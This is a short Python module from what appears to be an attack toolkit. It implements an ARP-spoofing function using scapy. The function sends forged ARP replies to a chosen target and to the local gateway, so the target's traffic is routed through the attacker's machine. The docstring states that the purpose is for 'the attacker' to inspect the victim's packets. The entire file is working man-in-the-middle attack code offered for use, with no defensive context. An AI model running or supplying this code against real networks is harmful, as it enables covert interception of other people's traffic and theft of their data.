"""This module provides the flood function for an ARP-Spoof attack."""

from time import sleep

from colorama import Fore as F
from getmac import get_mac_address as __get_host_mac
from scapy.all import send
from scapy.layers.l2 import ARP

from tools.addons.ip_tools import __get_local_host_ips, __get_mac

GATEWAY_IP = __get_local_host_ips()[0]
GATEWAY_MAC = __get_mac(GATEWAY_IP)
HOST_MAC = __get_host_mac()


def flood(target: str) -> None:
    """Start sending modified ARP requests to the target and the gateway.
    Now, all packets sent by the target will pass through our machine, and
    then it'll be forward sent to the gateway. That way, the attacker can
    use a raw packet analyzer to inspect the victims packets before sending
    them to the gateway.

    Args:
        - target - The target that will have its ARP table modified

    Returns:
        None
    """
    packet = ARP(op=2, pdst=target, hwdst=__get_mac(target), psrc=GATEWAY_IP)
    send(packet, verbose=False)

    packet = ARP(op=2, pdst=GATEWAY_IP, hwdst=GATEWAY_MAC, psrc=target)
    send(packet, verbose=False)

    print(
        f"{F.GREEN}{target}{F.RESET} now thinks that {F.BLUE}{GATEWAY_MAC}{F.RESET}"
        f" (Gateway's MAC Address) is {F.BLUE}{HOST_MAC}{F.RESET} (Your Mac Address){F.RESET}\r",
        end="",
    )
    sleep(2)
